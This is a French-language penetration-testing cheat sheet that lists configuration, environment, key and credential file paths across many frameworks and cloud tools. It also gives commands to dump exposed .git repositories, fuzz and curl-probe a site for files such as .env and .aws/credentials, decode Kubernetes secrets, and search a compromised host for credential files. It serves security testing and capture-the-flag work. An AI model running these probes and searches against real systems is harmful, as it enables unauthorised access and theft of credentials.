# Fichiers de configuration, env et secrets — liste exhaustive

---

## 1. Fichiers .env et variantes

```
.env
.env.local
.env.development
.env.development.local
.env.production
.env.production.local
.env.test
.env.staging
.env.example              # souvent laissé par erreur avec de vraies valeurs
.env.dist
.env.backup
.env.old
.env.save
.env.bak
.env.orig
.env~
.env.swp
config.env
app.env
docker.env
```

---

## 2. Version control (fuite du dépôt complet)

```
.git/                      # dossier entier -> extraction possible avec git-dumper
.git/config
.git/HEAD
.git/logs/HEAD
.gitignore                 # révèle ce que les devs voulaient CACHER (indice !)
.gitattributes
.svn/                       # Subversion
.svn/entries
.hg/                         # Mercurial
.hg/hgrc
.bzr/                        # Bazaar (rare)
CVS/
```

**Exploitation .git exposé :**

```bash
git-dumper http://site.com/.git/ ./dump
# ou manuellement
wget -r http://site.com/.git/
cd site.com && git checkout -- .
git log --all
git log -p                 # voir tout l'historique, y compris secrets supprimés
```

---

## 3. IDE / éditeurs

```
.vscode/settings.json
.idea/                       # JetBrains (workspace.xml contient parfois des credentials DB)
.idea/workspace.xml
*.sublime-project
.project
.classpath
.DS_Store                    # macOS, révèle la structure de dossiers
Thumbs.db                    # Windows
.vimrc
.viminfo
*.swp / *.swo                # fichiers de swap Vim (contenu en cours d'édition récupérable)
```

---

## 4. PHP

```
config.php
configuration.php
wp-config.php                # WordPress (DB creds en clair)
wp-config.php.bak
wp-config.php~
settings.php                 # Drupal
LocalSettings.php             # MediaWiki
configuration.php             # Joomla
.htaccess
.htpasswd
composer.json
composer.lock
vendor/composer/installed.json
php.ini
```

---

## 5. Node.js / JavaScript

```
.env
package.json                  # scripts parfois révélateurs
package-lock.json
.npmrc                        # peut contenir un token d'authentification npm privé
.yarnrc
node_modules/.package-lock.json
config/default.json           # config Node (module "config")
config/production.json
ecosystem.config.js           # PM2 (peut contenir env vars)
next.config.js
nuxt.config.js
```

---

## 6. Python

```
.env
settings.py                   # Django (SECRET_KEY, DB creds)
local_settings.py
config.py
instance/config.py            # Flask instance folder
.flaskenv
requirements.txt
Pipfile
Pipfile.lock
poetry.lock
pyproject.toml
.pypirc                       # credentials PyPI
__pycache__/                  # peut contenir des .pyc décompilables
celeryconfig.py
```

---

## 7. Ruby / Rails

```
config/database.yml           # credentials DB en clair (classique Rails)
config/secrets.yml
config/master.key             # clé de déchiffrement des credentials Rails 5.2+
config/credentials.yml.enc
.env
Gemfile
Gemfile.lock
config/application.yml
```

---

## 8. Java / Spring

```
application.properties
application.yml
application-dev.yml
application-prod.yml
bootstrap.yml
web.xml
WEB-INF/web.xml
WEB-INF/classes/
persistence.xml
hibernate.cfg.xml
pom.xml
build.gradle
gradle.properties             # peut contenir signing keys / repo credentials
```

---

## 9. .NET / C#

```
web.config                    # connection strings en clair
appsettings.json
appsettings.Development.json
appsettings.Production.json
Web.Debug.config
Web.Release.config
*.pubxml                       # profils de publication (parfois avec creds FTP/Azure)
packages.config
```

---

## 10. Conteneurs / orchestration

```
Dockerfile
docker-compose.yml
docker-compose.override.yml
.dockerignore
.docker/config.json            # credentials registry Docker
kubernetes/*.yaml
k8s/secrets.yaml                # souvent en base64 (PAS chiffré, juste encodé !)
helm/values.yaml
.kube/config                    # config cluster Kubernetes (credentials complets)
```

**Décodage d'un secret Kubernetes :**

```bash
kubectl get secret mysecret -o jsonpath='{.data.password}' | base64 -d
```

---

## 11. CI/CD

```
.gitlab-ci.yml
.github/workflows/*.yml
.travis.yml
Jenkinsfile
azure-pipelines.yml
bitbucket-pipelines.yml
.circleci/config.yml
buildspec.yml                   # AWS CodeBuild
```

Ces fichiers révèlent souvent des noms de variables secrètes (`$DEPLOY_KEY`, `$DB_PASSWORD`), voire des valeurs codées en dur par erreur.

---

## 12. Cloud providers

```
~/.aws/credentials
~/.aws/config
~/.azure/credentials
~/.config/gcloud/credentials.db
~/.config/gcloud/application_default_credentials.json
terraform.tfstate               # peut contenir des secrets en clair !
terraform.tfstate.backup
*.tfvars
.terraform/
serverless.yml                  # framework Serverless (AWS Lambda)
```

---

## 13. SSH / clés

```
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
~/.ssh/authorized_keys
~/.ssh/known_hosts
~/.ssh/config
/etc/ssh/sshd_config
*.pem
*.ppk                            # clé privée format PuTTY
```

---

## 14. Web servers

```
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/*
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/*
httpd.conf
.htaccess
.htpasswd
web.config
```

---

## 15. Bases de données (fichiers locaux)

```
*.sql                            # dumps
*.sqlite / *.sqlite3 / *.db
my.cnf / .my.cnf                 # credentials MySQL en clair
pg_hba.conf                      # PostgreSQL
mongod.conf
redis.conf                       # requirepass en clair
```

---

## 16. Historique shell / outils

```
~/.bash_history
~/.zsh_history
~/.mysql_history
~/.psql_history
~/.python_history
~/.lesshst
~/.viminfo
```

---

## 17. Backups génériques (patterns à fuzzer)

```
*.bak / *.backup / *.old / *.orig / *.save / *.swp / *~
site.zip / backup.zip / www.zip / html.tar.gz
database.sql.gz
config.php.bak
index.php~
```

---

## 18. Fichiers "secrets" génériques à toujours essayer

```
secret.txt / secrets.txt / secrets.json
credentials.txt / credentials.json
password.txt / passwords.txt
id_rsa
flag.txt / flag.php
.secret
.token
.credentials
api_key.txt
```

---

## Fuzzing web de ces fichiers (en pratique)

```bash
# Wordlist ciblée dotfiles/config (SecLists en a une dédiée)
ffuf -u http://site.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/dotfiles.txt -mc 200,403

# Recherche spécifique .env
ffuf -u http://site.com/FUZZ -w wordlist.txt -mc 200 -e .env,.bak,.old,.zip,.git

# Vérification rapide manuelle des classiques
for f in .env .env.bak .git/config wp-config.php config.php .aws/credentials; do
  echo "== $f =="
  curl -s -o /dev/null -w "%{http_code}\n" "http://site.com/$f"
done
```

## Recherche sur un filesystem compromis (une fois un shell obtenu)

```bash
find / -iname "*.env*" 2>/dev/null
find / -iname "*credential*" -o -iname "*secret*" -o -iname "*password*" 2>/dev/null
find / -iname "config.php" -o -iname "wp-config.php" -o -iname "settings.py" -o -iname "database.yml" 2>/dev/null
find / -iname "*.pem" -o -iname "id_rsa" -o -iname "*.ppk" 2>/dev/null
find / -name ".git" -type d 2>/dev/null
find / -iname "*.bak" -o -iname "*.old" -o -iname "*.backup" 2>/dev/null
```